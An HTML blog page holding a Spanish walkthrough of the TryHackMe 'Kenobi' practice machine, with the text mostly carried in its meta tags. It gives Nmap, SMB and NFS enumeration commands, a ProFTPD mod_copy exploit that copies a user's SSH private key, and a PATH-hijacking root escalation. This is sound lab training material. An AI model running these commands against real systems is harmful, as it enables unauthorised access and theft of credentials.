<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">

  <title>Kenobi - TryHackMe</title>

  <link rel="shortcut icon" href="/assets/images/favicon.ico">
  <link rel="icon" href="/assets/iamges/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/assets/images/favicon.gif" type="image/gif">

  <link rel="stylesheet" href="/assets/css/main.css">
  
  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Kenobi - TryHackMe | Filthy Hacker</title>
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Kenobi - TryHackMe" />
<meta name="author" content="Mateo Andino" />
<meta property="og:locale" content="es" />
<meta name="description" content="Hoy vamos a resolver la máquina Kenobi de TryHackMe. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla. Fase De Reconocimiento Primeramente, vamos a utilizar la herramienta Nmap para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente: nmap -p- --open -T5 -v -n &lt;dirección IP&gt; En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de puertos con Nmap: Parámetro Explicación -p- Escanea todo el rango de puertos (65535 en total) --open Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) -T5 La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos White Hat -v Verbose, reporta lo encontrado por consola -n No aplicar resolución DNS -sS Escaneo TCP SYN -min-rate Emitir paquetes no más lentos que &lt;valor&gt; por segundo -vvv Triple verbose, para obtener mayor información por consola -Pn No aplicar host discovery nmap -sC -sV -p 21,22,80,111,139,445,2049,35049,41843,47869,50933 &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con Nmap: Parámetro Explicación -sC Scripts básicos de enumeración -sV Versión y servicios que corren bajo los puertos encontrados -p Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) Con estos dos escaneos bastaría para responder a dos de las preguntas planteadas: ¿Cuántos puertos abiertos existen? ¿En qué puerto está corriendo el protocolo FTP? ¿Cuál es la versión del servicio ProFTPD que se está corriendo? Para responder a estas dos últimas preguntas solo tenemos que revisar el escaneo de versiones y servicios que realizamos con Nmap; por otra parte, la primera pregunta tiene algo de trampa, ya que la respuesta correcta es 7 puertos abiertos, mientras que con nuestro escaneo detectamos 11, ¿qué hicimos mal? Nada, lo que sucede es que nosotros al indicar el parámetro -p-, estamos escaneando todo el rango de puertos, si no indicáramos este parámetro, Nmap escanearía únicamente los 1000 puertos más comunes, por lo que vemos que TryHackMe no se dio la molestia de escanearlo todo por completo. Habiendo aclarado esto, los puertos abiertos más relevantes que encontramos son el 139 y el 445, ambos relacionados con el protocolo SMB (Server Message Block), el puerto 111 relacionado con el servicio rpcbind, relacionado a su vez con RPC (Remote Procedure Call), y el puerto 21 relacionado con el protocolo FTP (File Transfer Protocol). En este punto, TryHackMe nos sugiere usar el propio Nmap para enumerar los recursos compartidos a través de Samba, que si bien podemos hacerlo, optaremos por usar SMBMap y smbclient. SMBMap Para poder listar los recursos compartidos haciendo uso de SMBMap, bastará con indicar la direción IP de la máquina víctima. smbmap -H &lt;dirección IP&gt; Lo primero que podemos darnos cuenta es que existen 3 recursos compartidos, de los cuales solo tenemos acceso a uno, anonymous. Si decidimos listar de manera recursiva el recurso anonymous, encontraremos un archivo que lleva por nombre log.txt, el cual ya levanta nuestras sospechas. smbmap -H &lt;dirección IP&gt; -R anonymous Para poder descargar el archivo log.txt, podremos hacerlo usando tanto su ruta absoluta con el parámetro --download, o bien creando patrones mediante expresiones regulares con el parámetro -A. smbmap -H &lt;dirección IP&gt; --download anonymous/log.txt smbmap -H &lt;dirección IP&gt; -R anonymous -A log.txt smbclient Para poder listar los recursos compartidos haciendo uso de smbclient tendremos que especificar el parámetro -L, adicional a ello tendremos que indicar que queremos hacer uso de un null session con el parámetro -N, ya que no conocemos credenciales con las cuales autenticarnos; esto con SMBMap no ocurría ya que por defecto hace uso de un null session, a no ser que le indiquemos un usuario y contraseña. smbclient -N -L &lt;dirección IP&gt; En este caso, no se nos indica los permisos que tenemos sobre los recursos, no obstante, podemos intuir a que recursos tenemos acceso, por ejemplo, el recurso print$ se relaciona con impresoras que se están compartiendo a nivel de red, por otra parte, tenemos el recurso IPC$ el cual crea el propio Windows para poder hacer uso de los null sessions; de modo que, de los 3 recursos compartidos existentes, solo nos queda anonymous. Lo siguiente que haremos será listar el contenido que se encuentra dentro del recurso anonymous. smbclient -N //dirección IP/anonymous ls Podemos observar que dentro existe un archivo llamado log.txt, el cual procederemos a descargar. smbclient -N //dirección IP/anonymous get log.txt Independientemente de como hayamos descargado el archivo log.txt, al leerlo, lo más importante que encontraremos será la ubicación del par de claves RSA, ubicadas en /home/kenobi/.ssh. Adicionalmente, encontraremos información tanto del servicio ProFTPD, como del Samba, pero nada realmente interesante, por lo que estamos omitiendo algo. Si recordamos, el puerto 111, relacionado con rpcbind, estaba abierto, y lo que nos mostraba nuestro escaneo de versiones y servicios con Nmap, es que en este puerto está corriendo a su vez el protocolo NFS (Network File System) en el puerto 2049. El protocolo NFS se utiliza principalmente para acceder a archivos compartidos a nivel de red, de manera local. Comprobemos si se está compartiendo algún recurso que podamos montar en nuestro equipo. sudo showmount -e &lt;dirección IP&gt; La ruta /var está siendo compartida a nivel de red, de modo que si lográramos mover algún archivo potencial dentro de esta ruta, y luego la montásemos en nuestro equipo, podríamos visualizar dicho archivo de manera local. Fase De Explotación Lo primero que podemos pensar es buscar alguna vulnerabilidad en el servicio ProFTPD, basado en FTP (File Transfer Protocol), moviendo así archivos desde el lado del cliente, hacia el servidor. Para explotar el servicio ProFTPD, empezaremos buscando algún exploit que se encuentre en Exploit Database, para ello utilizaremos SearchSploit para poder seguir trabajando desde nuestra terminal. searchsploit ProFTPD 1.3.5 De los 4 exploits que encontramos, nos quedaremos con el último Concretamente con las líneas 12, 13 y 14. Las cuales nos permiten hacer justamente lo que nos interesa, copiar un archivo de una ruta (CPFR), a otra (CPTO). De este modo, si nos conectamos a la máquina víctima a través del puerto 21, podremos ejecutar estos comandos. nc &lt;direción IP&gt; 21 SITE CPFR /home/kenobi/.ssh/id_rsa SITE CPTO /var/tmp/id_rsa Ya con todo esto, podemos montar la ruta /var en nuestro equipo, para ello haremos lo siguiente: sudo mount &lt;dirección IP&gt;:/var /mnt/kenobiNFS En caso de que tengamos un error similar a este: Simplemente tendremos que instalar lo siguiente: sudo apt install nfs-common Y ya que estamos, podemos también instalar la utilidad para montar archivo de tipo CIFS, que puede resultarnos de utilidad en algún momento. sudo apt install cifs-utils Una vez tenemos montada la ruta /var en nuestro equipo, procederemos a copiarnos el archivo id_rsa que movimos con anterioridad haciendo uso de ProFTPD. Finalmente, podemos conectarnos a la máquina víctima a través de SSH sin proporcionar contraseña, ya que tenemos en nuestro poder la clave privada del usuario Kenobi, no obstante, antes de hacerlo, vamos a asignar los permisos correspondientes al archivo id_rsa. sudo chmod 600 id_rsa ssh -i id_rsa kenobi@&lt;dirección IP&gt; Escalada De Privilegios Para realizar esta última fase, la misma plataforma de TryHackMe nos sugiere aprovecharnos de algún binario con permisos mal asignados, concretamente permisos SUID. Para listar todos aquellos binarios con permisos SUID asignados, tenemos varias opciones, no obstante, estas son las que yo utilizo: find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \; find / -uid 0 -perm -4000 -type f 2&gt;/dev/null La forma más sencilla para abusar de algún binario con permisos mal asignados sería recurrir a GTFOBins, sin embargo, el binario que llama nuestra atención no es propio del sistema, por lo que GTFOBins, no nos será de utilidad. Si comprobamos en nuestra máquina de atacantes, no existe ningún binario /usr/bin/menu, por lo que este debe haber sido creado, de modo que puede tener alguna falla de seguridad, vamos a revisarlo. Vemos que el binario es lo que dice ser, un menú que nos presenta tres únicas posibilidades, vamos a echar un vistazo más a fondo. strings /usr/bin/menu Podemos observar los binarios que utiliza este menú dependiendo de la opción que seleccionemos, lo más interesante aquí es que no se está empleando la ruta completa de estos comandos, tan solo se los está mencionando, por lo que, al no hacer esta verificación, podemos suplantarlos. Antes de que el binario /usr/bin/menu encuentre los binarios legítimos dentro de la variable de entorno PATH, nosotros añadiremos nuestros propios binarios en el inicio, los cuales serán igual en nombre, pero ejecutarán el código que nos interese, en este caso una consola con máximos privilegios. Este proceso podemos realizarlo para cualquiera de los tres binarios, curl, uname o ifconfig, eso si, debemos de encontrarnos en una ruta donde tengamos permisos de escritura, el directorio del usuario Kenobi, o la ruta /tmp por ejemplo. echo &#39;/bin/sh&#39; &gt; uname export PATH=/home/kenobi:$PATH chmod +x uname" />
<meta property="og:description" content="Hoy vamos a resolver la máquina Kenobi de TryHackMe. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla. Fase De Reconocimiento Primeramente, vamos a utilizar la herramienta Nmap para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente: nmap -p- --open -T5 -v -n &lt;dirección IP&gt; En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de puertos con Nmap: Parámetro Explicación -p- Escanea todo el rango de puertos (65535 en total) --open Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) -T5 La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos White Hat -v Verbose, reporta lo encontrado por consola -n No aplicar resolución DNS -sS Escaneo TCP SYN -min-rate Emitir paquetes no más lentos que &lt;valor&gt; por segundo -vvv Triple verbose, para obtener mayor información por consola -Pn No aplicar host discovery nmap -sC -sV -p 21,22,80,111,139,445,2049,35049,41843,47869,50933 &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con Nmap: Parámetro Explicación -sC Scripts básicos de enumeración -sV Versión y servicios que corren bajo los puertos encontrados -p Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) Con estos dos escaneos bastaría para responder a dos de las preguntas planteadas: ¿Cuántos puertos abiertos existen? ¿En qué puerto está corriendo el protocolo FTP? ¿Cuál es la versión del servicio ProFTPD que se está corriendo? Para responder a estas dos últimas preguntas solo tenemos que revisar el escaneo de versiones y servicios que realizamos con Nmap; por otra parte, la primera pregunta tiene algo de trampa, ya que la respuesta correcta es 7 puertos abiertos, mientras que con nuestro escaneo detectamos 11, ¿qué hicimos mal? Nada, lo que sucede es que nosotros al indicar el parámetro -p-, estamos escaneando todo el rango de puertos, si no indicáramos este parámetro, Nmap escanearía únicamente los 1000 puertos más comunes, por lo que vemos que TryHackMe no se dio la molestia de escanearlo todo por completo. Habiendo aclarado esto, los puertos abiertos más relevantes que encontramos son el 139 y el 445, ambos relacionados con el protocolo SMB (Server Message Block), el puerto 111 relacionado con el servicio rpcbind, relacionado a su vez con RPC (Remote Procedure Call), y el puerto 21 relacionado con el protocolo FTP (File Transfer Protocol). En este punto, TryHackMe nos sugiere usar el propio Nmap para enumerar los recursos compartidos a través de Samba, que si bien podemos hacerlo, optaremos por usar SMBMap y smbclient. SMBMap Para poder listar los recursos compartidos haciendo uso de SMBMap, bastará con indicar la direción IP de la máquina víctima. smbmap -H &lt;dirección IP&gt; Lo primero que podemos darnos cuenta es que existen 3 recursos compartidos, de los cuales solo tenemos acceso a uno, anonymous. Si decidimos listar de manera recursiva el recurso anonymous, encontraremos un archivo que lleva por nombre log.txt, el cual ya levanta nuestras sospechas. smbmap -H &lt;dirección IP&gt; -R anonymous Para poder descargar el archivo log.txt, podremos hacerlo usando tanto su ruta absoluta con el parámetro --download, o bien creando patrones mediante expresiones regulares con el parámetro -A. smbmap -H &lt;dirección IP&gt; --download anonymous/log.txt smbmap -H &lt;dirección IP&gt; -R anonymous -A log.txt smbclient Para poder listar los recursos compartidos haciendo uso de smbclient tendremos que especificar el parámetro -L, adicional a ello tendremos que indicar que queremos hacer uso de un null session con el parámetro -N, ya que no conocemos credenciales con las cuales autenticarnos; esto con SMBMap no ocurría ya que por defecto hace uso de un null session, a no ser que le indiquemos un usuario y contraseña. smbclient -N -L &lt;dirección IP&gt; En este caso, no se nos indica los permisos que tenemos sobre los recursos, no obstante, podemos intuir a que recursos tenemos acceso, por ejemplo, el recurso print$ se relaciona con impresoras que se están compartiendo a nivel de red, por otra parte, tenemos el recurso IPC$ el cual crea el propio Windows para poder hacer uso de los null sessions; de modo que, de los 3 recursos compartidos existentes, solo nos queda anonymous. Lo siguiente que haremos será listar el contenido que se encuentra dentro del recurso anonymous. smbclient -N //dirección IP/anonymous ls Podemos observar que dentro existe un archivo llamado log.txt, el cual procederemos a descargar. smbclient -N //dirección IP/anonymous get log.txt Independientemente de como hayamos descargado el archivo log.txt, al leerlo, lo más importante que encontraremos será la ubicación del par de claves RSA, ubicadas en /home/kenobi/.ssh. Adicionalmente, encontraremos información tanto del servicio ProFTPD, como del Samba, pero nada realmente interesante, por lo que estamos omitiendo algo. Si recordamos, el puerto 111, relacionado con rpcbind, estaba abierto, y lo que nos mostraba nuestro escaneo de versiones y servicios con Nmap, es que en este puerto está corriendo a su vez el protocolo NFS (Network File System) en el puerto 2049. El protocolo NFS se utiliza principalmente para acceder a archivos compartidos a nivel de red, de manera local. Comprobemos si se está compartiendo algún recurso que podamos montar en nuestro equipo. sudo showmount -e &lt;dirección IP&gt; La ruta /var está siendo compartida a nivel de red, de modo que si lográramos mover algún archivo potencial dentro de esta ruta, y luego la montásemos en nuestro equipo, podríamos visualizar dicho archivo de manera local. Fase De Explotación Lo primero que podemos pensar es buscar alguna vulnerabilidad en el servicio ProFTPD, basado en FTP (File Transfer Protocol), moviendo así archivos desde el lado del cliente, hacia el servidor. Para explotar el servicio ProFTPD, empezaremos buscando algún exploit que se encuentre en Exploit Database, para ello utilizaremos SearchSploit para poder seguir trabajando desde nuestra terminal. searchsploit ProFTPD 1.3.5 De los 4 exploits que encontramos, nos quedaremos con el último Concretamente con las líneas 12, 13 y 14. Las cuales nos permiten hacer justamente lo que nos interesa, copiar un archivo de una ruta (CPFR), a otra (CPTO). De este modo, si nos conectamos a la máquina víctima a través del puerto 21, podremos ejecutar estos comandos. nc &lt;direción IP&gt; 21 SITE CPFR /home/kenobi/.ssh/id_rsa SITE CPTO /var/tmp/id_rsa Ya con todo esto, podemos montar la ruta /var en nuestro equipo, para ello haremos lo siguiente: sudo mount &lt;dirección IP&gt;:/var /mnt/kenobiNFS En caso de que tengamos un error similar a este: Simplemente tendremos que instalar lo siguiente: sudo apt install nfs-common Y ya que estamos, podemos también instalar la utilidad para montar archivo de tipo CIFS, que puede resultarnos de utilidad en algún momento. sudo apt install cifs-utils Una vez tenemos montada la ruta /var en nuestro equipo, procederemos a copiarnos el archivo id_rsa que movimos con anterioridad haciendo uso de ProFTPD. Finalmente, podemos conectarnos a la máquina víctima a través de SSH sin proporcionar contraseña, ya que tenemos en nuestro poder la clave privada del usuario Kenobi, no obstante, antes de hacerlo, vamos a asignar los permisos correspondientes al archivo id_rsa. sudo chmod 600 id_rsa ssh -i id_rsa kenobi@&lt;dirección IP&gt; Escalada De Privilegios Para realizar esta última fase, la misma plataforma de TryHackMe nos sugiere aprovecharnos de algún binario con permisos mal asignados, concretamente permisos SUID. Para listar todos aquellos binarios con permisos SUID asignados, tenemos varias opciones, no obstante, estas son las que yo utilizo: find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \; find / -uid 0 -perm -4000 -type f 2&gt;/dev/null La forma más sencilla para abusar de algún binario con permisos mal asignados sería recurrir a GTFOBins, sin embargo, el binario que llama nuestra atención no es propio del sistema, por lo que GTFOBins, no nos será de utilidad. Si comprobamos en nuestra máquina de atacantes, no existe ningún binario /usr/bin/menu, por lo que este debe haber sido creado, de modo que puede tener alguna falla de seguridad, vamos a revisarlo. Vemos que el binario es lo que dice ser, un menú que nos presenta tres únicas posibilidades, vamos a echar un vistazo más a fondo. strings /usr/bin/menu Podemos observar los binarios que utiliza este menú dependiendo de la opción que seleccionemos, lo más interesante aquí es que no se está empleando la ruta completa de estos comandos, tan solo se los está mencionando, por lo que, al no hacer esta verificación, podemos suplantarlos. Antes de que el binario /usr/bin/menu encuentre los binarios legítimos dentro de la variable de entorno PATH, nosotros añadiremos nuestros propios binarios en el inicio, los cuales serán igual en nombre, pero ejecutarán el código que nos interese, en este caso una consola con máximos privilegios. Este proceso podemos realizarlo para cualquiera de los tres binarios, curl, uname o ifconfig, eso si, debemos de encontrarnos en una ruta donde tengamos permisos de escritura, el directorio del usuario Kenobi, o la ruta /tmp por ejemplo. echo &#39;/bin/sh&#39; &gt; uname export PATH=/home/kenobi:$PATH chmod +x uname" />
<meta property="og:site_name" content="Filthy Hacker" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-02-07T00:00:00-05:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Kenobi - TryHackMe" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Mateo Andino","url":"https://mateonitro550.github.io"},"dateModified":"2022-02-07T00:00:00-05:00","datePublished":"2022-02-07T00:00:00-05:00","description":"Hoy vamos a resolver la máquina Kenobi de TryHackMe. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla. Fase De Reconocimiento Primeramente, vamos a utilizar la herramienta Nmap para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente: nmap -p- --open -T5 -v -n &lt;dirección IP&gt; En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa: sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de puertos con Nmap: Parámetro Explicación -p- Escanea todo el rango de puertos (65535 en total) --open Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) -T5 La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos White Hat -v Verbose, reporta lo encontrado por consola -n No aplicar resolución DNS -sS Escaneo TCP SYN -min-rate Emitir paquetes no más lentos que &lt;valor&gt; por segundo -vvv Triple verbose, para obtener mayor información por consola -Pn No aplicar host discovery nmap -sC -sV -p 21,22,80,111,139,445,2049,35049,41843,47869,50933 &lt;dirección IP&gt; A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con Nmap: Parámetro Explicación -sC Scripts básicos de enumeración -sV Versión y servicios que corren bajo los puertos encontrados -p Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) Con estos dos escaneos bastaría para responder a dos de las preguntas planteadas: ¿Cuántos puertos abiertos existen? ¿En qué puerto está corriendo el protocolo FTP? ¿Cuál es la versión del servicio ProFTPD que se está corriendo? Para responder a estas dos últimas preguntas solo tenemos que revisar el escaneo de versiones y servicios que realizamos con Nmap; por otra parte, la primera pregunta tiene algo de trampa, ya que la respuesta correcta es 7 puertos abiertos, mientras que con nuestro escaneo detectamos 11, ¿qué hicimos mal? Nada, lo que sucede es que nosotros al indicar el parámetro -p-, estamos escaneando todo el rango de puertos, si no indicáramos este parámetro, Nmap escanearía únicamente los 1000 puertos más comunes, por lo que vemos que TryHackMe no se dio la molestia de escanearlo todo por completo. Habiendo aclarado esto, los puertos abiertos más relevantes que encontramos son el 139 y el 445, ambos relacionados con el protocolo SMB (Server Message Block), el puerto 111 relacionado con el servicio rpcbind, relacionado a su vez con RPC (Remote Procedure Call), y el puerto 21 relacionado con el protocolo FTP (File Transfer Protocol). En este punto, TryHackMe nos sugiere usar el propio Nmap para enumerar los recursos compartidos a través de Samba, que si bien podemos hacerlo, optaremos por usar SMBMap y smbclient. SMBMap Para poder listar los recursos compartidos haciendo uso de SMBMap, bastará con indicar la direción IP de la máquina víctima. smbmap -H &lt;dirección IP&gt; Lo primero que podemos darnos cuenta es que existen 3 recursos compartidos, de los cuales solo tenemos acceso a uno, anonymous. Si decidimos listar de manera recursiva el recurso anonymous, encontraremos un archivo que lleva por nombre log.txt, el cual ya levanta nuestras sospechas. smbmap -H &lt;dirección IP&gt; -R anonymous Para poder descargar el archivo log.txt, podremos hacerlo usando tanto su ruta absoluta con el parámetro --download, o bien creando patrones mediante expresiones regulares con el parámetro -A. smbmap -H &lt;dirección IP&gt; --download anonymous/log.txt smbmap -H &lt;dirección IP&gt; -R anonymous -A log.txt smbclient Para poder listar los recursos compartidos haciendo uso de smbclient tendremos que especificar el parámetro -L, adicional a ello tendremos que indicar que queremos hacer uso de un null session con el parámetro -N, ya que no conocemos credenciales con las cuales autenticarnos; esto con SMBMap no ocurría ya que por defecto hace uso de un null session, a no ser que le indiquemos un usuario y contraseña. smbclient -N -L &lt;dirección IP&gt; En este caso, no se nos indica los permisos que tenemos sobre los recursos, no obstante, podemos intuir a que recursos tenemos acceso, por ejemplo, el recurso print$ se relaciona con impresoras que se están compartiendo a nivel de red, por otra parte, tenemos el recurso IPC$ el cual crea el propio Windows para poder hacer uso de los null sessions; de modo que, de los 3 recursos compartidos existentes, solo nos queda anonymous. Lo siguiente que haremos será listar el contenido que se encuentra dentro del recurso anonymous. smbclient -N //dirección IP/anonymous ls Podemos observar que dentro existe un archivo llamado log.txt, el cual procederemos a descargar. smbclient -N //dirección IP/anonymous get log.txt Independientemente de como hayamos descargado el archivo log.txt, al leerlo, lo más importante que encontraremos será la ubicación del par de claves RSA, ubicadas en /home/kenobi/.ssh. Adicionalmente, encontraremos información tanto del servicio ProFTPD, como del Samba, pero nada realmente interesante, por lo que estamos omitiendo algo. Si recordamos, el puerto 111, relacionado con rpcbind, estaba abierto, y lo que nos mostraba nuestro escaneo de versiones y servicios con Nmap, es que en este puerto está corriendo a su vez el protocolo NFS (Network File System) en el puerto 2049. El protocolo NFS se utiliza principalmente para acceder a archivos compartidos a nivel de red, de manera local. Comprobemos si se está compartiendo algún recurso que podamos montar en nuestro equipo. sudo showmount -e &lt;dirección IP&gt; La ruta /var está siendo compartida a nivel de red, de modo que si lográramos mover algún archivo potencial dentro de esta ruta, y luego la montásemos en nuestro equipo, podríamos visualizar dicho archivo de manera local. Fase De Explotación Lo primero que podemos pensar es buscar alguna vulnerabilidad en el servicio ProFTPD, basado en FTP (File Transfer Protocol), moviendo así archivos desde el lado del cliente, hacia el servidor. Para explotar el servicio ProFTPD, empezaremos buscando algún exploit que se encuentre en Exploit Database, para ello utilizaremos SearchSploit para poder seguir trabajando desde nuestra terminal. searchsploit ProFTPD 1.3.5 De los 4 exploits que encontramos, nos quedaremos con el último Concretamente con las líneas 12, 13 y 14. Las cuales nos permiten hacer justamente lo que nos interesa, copiar un archivo de una ruta (CPFR), a otra (CPTO). De este modo, si nos conectamos a la máquina víctima a través del puerto 21, podremos ejecutar estos comandos. nc &lt;direción IP&gt; 21 SITE CPFR /home/kenobi/.ssh/id_rsa SITE CPTO /var/tmp/id_rsa Ya con todo esto, podemos montar la ruta /var en nuestro equipo, para ello haremos lo siguiente: sudo mount &lt;dirección IP&gt;:/var /mnt/kenobiNFS En caso de que tengamos un error similar a este: Simplemente tendremos que instalar lo siguiente: sudo apt install nfs-common Y ya que estamos, podemos también instalar la utilidad para montar archivo de tipo CIFS, que puede resultarnos de utilidad en algún momento. sudo apt install cifs-utils Una vez tenemos montada la ruta /var en nuestro equipo, procederemos a copiarnos el archivo id_rsa que movimos con anterioridad haciendo uso de ProFTPD. Finalmente, podemos conectarnos a la máquina víctima a través de SSH sin proporcionar contraseña, ya que tenemos en nuestro poder la clave privada del usuario Kenobi, no obstante, antes de hacerlo, vamos a asignar los permisos correspondientes al archivo id_rsa. sudo chmod 600 id_rsa ssh -i id_rsa kenobi@&lt;dirección IP&gt; Escalada De Privilegios Para realizar esta última fase, la misma plataforma de TryHackMe nos sugiere aprovecharnos de algún binario con permisos mal asignados, concretamente permisos SUID. Para listar todos aquellos binarios con permisos SUID asignados, tenemos varias opciones, no obstante, estas son las que yo utilizo: find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \\; find / -uid 0 -perm -4000 -type f 2&gt;/dev/null La forma más sencilla para abusar de algún binario con permisos mal asignados sería recurrir a GTFOBins, sin embargo, el binario que llama nuestra atención no es propio del sistema, por lo que GTFOBins, no nos será de utilidad. Si comprobamos en nuestra máquina de atacantes, no existe ningún binario /usr/bin/menu, por lo que este debe haber sido creado, de modo que puede tener alguna falla de seguridad, vamos a revisarlo. Vemos que el binario es lo que dice ser, un menú que nos presenta tres únicas posibilidades, vamos a echar un vistazo más a fondo. strings /usr/bin/menu Podemos observar los binarios que utiliza este menú dependiendo de la opción que seleccionemos, lo más interesante aquí es que no se está empleando la ruta completa de estos comandos, tan solo se los está mencionando, por lo que, al no hacer esta verificación, podemos suplantarlos. Antes de que el binario /usr/bin/menu encuentre los binarios legítimos dentro de la variable de entorno PATH, nosotros añadiremos nuestros propios binarios en el inicio, los cuales serán igual en nombre, pero ejecutarán el código que nos interese, en este caso una consola con máximos privilegios. Este proceso podemos realizarlo para cualquiera de los tres binarios, curl, uname o ifconfig, eso si, debemos de encontrarnos en una ruta donde tengamos permisos de escritura, el directorio del usuario Kenobi, o la ruta /tmp por ejemplo. echo &#39;/bin/sh&#39; &gt; uname export PATH=/home/kenobi:$PATH chmod +x uname","headline":"Kenobi - TryHackMe","mainEntityOfPage":{"@type":"WebPage","@id":"/es/Kenobi-TryHackMe/"},"url":"/es/Kenobi-TryHackMe/"}</script>
<!-- End Jekyll SEO tag -->


  <!-- Google Tag Manager -->
  <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
  new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
  j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
  'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
  })(window,document,'script','dataLayer','GTM-PPKV9V8T');</script>
  <!-- End Google Tag Manager -->

</head>



<body>

  <!-- Google Tag Manager (noscript) -->
  <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PPKV9V8T"
  height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
  <!-- End Google Tag Manager (noscript) -->

  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    
    <h1 class="glitch-header">filthyHacker@home:~$</h1>
    </a>
    <div class="header-links">
      <a href="/es"><h2 class="header-link">Publicaciones</h2></a>
<a href="/es/search"><h2 class="header-link">Buscar</h2></a>
<a href="/es/archive"><h2 class="header-link">Archivo</h2></a>
<a href="/en"><h2 class="header-link">English</h2></a>

    </div>
  </div>
</header>

    <div class="container">
      <section id="main_content">
        <article>
  <h2>Kenobi - TryHackMe</h2>
  <time datetime="2022-02-07T00:00:00-05:00" class="by-line">
    
      07/02/2022
    
  </time>
  <p>Hoy vamos a resolver la máquina <em>Kenobi</em> de <em>TryHackMe</em>. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/1.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>

<p>Primeramente, vamos a utilizar la herramienta <em>Nmap</em> para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo.</p>

<p>Para determinar que puertos están abiertos podemos realizar lo siguiente:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> &lt;dirección IP&gt;
</code></pre></div></div>

<p>En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> &lt;dirección IP&gt;
</code></pre></div></div>

<p>A continuación se explican los parámetros utilizados en el escaneo de puertos con <em>Nmap</em>:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Parámetro</th>
      <th style="text-align: left">Explicación</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">-p-</td>
      <td style="text-align: left">Escanea todo el rango de puertos (65535 en total)</td>
    </tr>
    <tr>
      <td style="text-align: left">--open</td>
      <td style="text-align: left">Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)</td>
    </tr>
    <tr>
      <td style="text-align: left">-T5</td>
